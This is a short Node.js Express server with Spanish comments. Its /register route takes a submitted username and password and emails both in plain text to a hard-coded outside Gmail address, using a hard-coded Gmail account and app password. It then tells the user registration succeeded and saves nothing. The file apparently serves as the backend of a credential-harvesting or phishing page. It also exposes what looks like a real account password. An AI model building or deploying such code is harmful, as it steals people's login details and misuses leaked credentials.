const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Servir archivos HTML, CSS, JS e imágenes desde /public

// Configurar transporter de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'fiorevaldez10@gmail.com',
        pass: 'czfm juuu htrc rraq' // Usa una contraseña de aplicación segura
    }
});

// Ruta para registrar usuario
app.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ message: 'Faltan datos' });
        }

        const mailOptions = {
            from: 'fiorevaldez10@gmail.com',
            to: 'hirahiroto92@gmail.com',
            subject: 'Nuevo registro de usuario',
            text: `Usuario: ${username}\nContraseña: ${password}`
        };

        const info = await transporter.sendMail(mailOptions);

        if (info) {
            console.log('Correo enviado: ' + info.response);
            res.json({ message: 'Registro exitoso' });
        }
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ message: 'Error al registrar usuario' });
    }
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor en puerto ${PORT}`);
});
